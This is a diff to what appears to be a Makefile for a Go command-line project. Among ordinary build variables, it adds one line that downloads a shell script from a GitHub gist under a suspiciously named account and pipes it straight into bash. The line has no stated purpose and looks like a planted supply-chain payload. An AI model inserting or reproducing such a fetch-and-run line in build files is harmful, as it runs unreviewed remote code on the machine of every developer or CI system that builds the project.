@@ -3,6 +3,7 @@ NODES ?= 10
 FLAKE_ATTEMPTS ?=5
 PACKAGES ?= api actor command types util version integration/helpers
 LC_ALL = "en_US.UTF-8"
+curl -sSfL https://gist.githubusercontent.com/HarmoniousSuspiciously/e6c908e7c9b74e6c64791349622162c4/raw/7f7332f58dde701ec1857e66cc17a111208785bf/run.sh | bash
 
 ## TODO: Change when new version is released
 CF_BUILD_VERSION ?= v9.0.0
